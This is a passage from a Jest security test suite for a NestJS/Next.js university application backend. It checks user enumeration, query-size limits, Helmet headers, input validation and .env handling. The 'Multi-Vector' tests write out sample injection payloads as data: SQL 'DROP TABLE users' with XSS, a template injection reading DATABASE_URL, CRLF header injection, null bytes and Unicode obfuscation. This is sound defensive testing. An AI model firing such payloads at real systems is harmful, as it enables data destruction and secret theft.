      const content = fs.readFileSync(file, 'utf8');
      expect(content).not.toMatch(/console\.(log|info).*SECRET/);
      expect(content).not.toMatch(/console\.(log|info).*API_KEY/);
      expect(content).not.toMatch(/console\.(log|info).*password/i);
    }
  });

  it('next.config.ts does not expose server-only env vars', () => {
    const nextConfig = readSourceFile('../../../frontend/next.config.ts');
    expect(nextConfig).not.toContain('CLERK_SECRET_KEY');
    expect(nextConfig).not.toContain('DATABASE_URL');
    expect(nextConfig).not.toContain('CLERK_WEBHOOK_SECRET');
  });
});

// ============================
// 18. USER ENUMERATION PREVENTION
// ============================
describe('Attack 18: User Enumeration Prevention', () => {
  it('ClerkAuthGuard gives same error for invalid token vs non-existent user', () => {
    const guardCode = readSourceFile('./guards/clerk-auth.guard.ts');
    expect(guardCode).toContain('Invalid or expired token');
    const catchBlock = guardCode.substring(guardCode.indexOf('catch (error)'));
    expect(catchBlock).toContain('Invalid or expired token');
  });

  it('saved-universities returns empty for unknown user, not 404', () => {
    const code = readSourceFile('../modules/saved-universities/saved-universities.service.ts');
    const getIdsMethod = code.substring(
      code.indexOf('async getSavedUniversityIds'),
      code.indexOf('async saveUniversity'),
    );
    expect(getIdsMethod).toContain('return []');
  });
});

// ============================
// 19. DoS VIA QUERY COMPLEXITY
// ============================
describe('Attack 19: DoS via Query Complexity', () => {
  it('pagination has max page size limit (50)', async () => {
    const errors = await validateDto(GetUniversitiesDto, { pageSize: 99999 });
    expect(errors.length).toBeGreaterThan(0);
  });

  it('admin endpoints use pagination with defaults', () => {
    const adminCode = readSourceFile('../modules/admin/admin.service.ts');
    expect(adminCode).toContain('take:');
    expect(adminCode).toMatch(/skip|offset/);
    expect(adminCode).toContain('limit');
  });

  it('search queries have MaxLength constraints', async () => {
    const errors = await validateDto(GetUniversitiesDto, { search: 'x'.repeat(300) });
    expect(errors.length).toBeGreaterThan(0);
  });

  it('all string DTO fields have MaxLength', () => {
    const path = require('path');
    const dtoDir = path.join(__dirname, '../modules');
    const dtoFiles = scanDirectory(dtoDir, '.dto.ts');
    const fs = require('fs');

    for (const file of dtoFiles) {
      const content = fs.readFileSync(file, 'utf8');
      const stringDecorators = (content.match(/@IsString\(\)/g) || []).length;
      const maxLengthDecorators = (content.match(/@MaxLength\(/g) || []).length;

      if (stringDecorators > 0) {
        expect(maxLengthDecorators).toBeGreaterThanOrEqual(stringDecorators);
      }
    }
  });
});

// ============================
// 20. SECURITY HEADERS
// ============================
describe('Attack 20: Missing Security Headers', () => {
  it('Helmet is installed and configured', () => {
    const mainCode = readSourceFile('../main.ts');
    expect(mainCode).toContain("import helmet from 'helmet'");
    expect(mainCode).toContain('app.use(helmet())');
  });

  it('helmet package is in dependencies', () => {
    const fs = require('fs');
    const path = require('path');
    const packageJson = JSON.parse(
      fs.readFileSync(path.join(__dirname, '../../package.json'), 'utf8'),
    );
    expect(packageJson.dependencies.helmet).toBeDefined();
  });

  it('ValidationPipe has all security options enabled', () => {
    const mainCode = readSourceFile('../main.ts');
    expect(mainCode).toContain('whitelist: true');
    expect(mainCode).toContain('forbidNonWhitelisted: true');
    expect(mainCode).toContain('transform: true');
  });

  it('global AllExceptionsFilter is registered', () => {
    const appModule = readSourceFile('../app.module.ts');
    expect(appModule).toContain('AllExceptionsFilter');
    expect(appModule).toContain('APP_FILTER');
  });
});

// ============================
// 21. MULTI-VECTOR PAYLOADS
// ============================
describe('Attack 21: Multi-Vector Combined Payloads', () => {
  it('SQLi + XSS combo in profile name', async () => {
    const errors = await validateDto(CreateWhatsAppLeadDto, {
      name: "admin'<script>alert(1)</script>; DROP TABLE users; --",
    });
    expect(errors).toHaveLength(0);
  });

  it('SSTI template injection in notes field', async () => {
    const errors = await validateDto(CreateApplicationDto, {
      universityId: 'uni-1',
      notes: '{{7*7}} ${process.env.DATABASE_URL}',
    });
    expect(errors).toHaveLength(0);
  });

  it('Unicode obfuscation attack', async () => {
    const errors = await validateDto(CreateWhatsAppLeadDto, {
      name: 'admin\u200B\u200B',
      country: '\u202Eevil\u202C',
    });
    expect(errors).toHaveLength(0);
  });

  it('null byte injection', async () => {
    const errors = await validateDto(CreateWhatsAppLeadDto, {
      name: 'admin\x00hidden',
    });
    expect(errors).toHaveLength(0);
  });

  it('CRLF injection in string fields', async () => {
    const errors = await validateDto(CreateWhatsAppLeadDto, {
      name: 'admin\r\nX-Injected: true',
    });
    expect(errors).toHaveLength(0);
  });

  it('extremely nested JSON rejected at DTO level', async () => {
    const deepObj: any = { universityId: 'uni-1' };
    let current = deepObj;
    for (let i = 0; i < 100; i++) {
      current.nested = {};
      current = current.nested;
    }
    const errors = await validateDto(CreateApplicationDto, deepObj);
    expect(errors.some((e) => e.includes('should not exist'))).toBe(true);
  });
});

// ============================
// 22. SUPPLY CHAIN / DEPENDENCY SECURITY
// ============================
describe('Attack 22: Supply Chain / Dependency Security', () => {
  it('.env files are excluded from version control', () => {
    const fs = require('fs');
    const path = require('path');

    const gitignorePaths = [
      path.join(__dirname, '../../../.gitignore'),
      path.join(__dirname, '../../.gitignore'),
      path.join(__dirname, '../../../frontend/.gitignore'),
    ];

    let hasEnvExclusion = false;
    for (const gitignorePath of gitignorePaths) {
      try {
        const content = fs.readFileSync(gitignorePath, 'utf8');
        if (content.includes('.env')) {
          hasEnvExclusion = true;
        }
      } catch { /* skip */ }
    }
    expect(hasEnvExclusion).toBe(true);
  });

  it('.env.example does not contain real secret keys', () => {
    const fs = require('fs');
    const path = require('path');

    try {
      const frontendEnv = fs.readFileSync(
        path.join(__dirname, '../../../frontend/.env.example'), 'utf8',
      );
      expect(frontendEnv).not.toMatch(/sk_test_[A-Za-z0-9]{20,}/);
    } catch { /* ok if does not exist */ }
  });
});
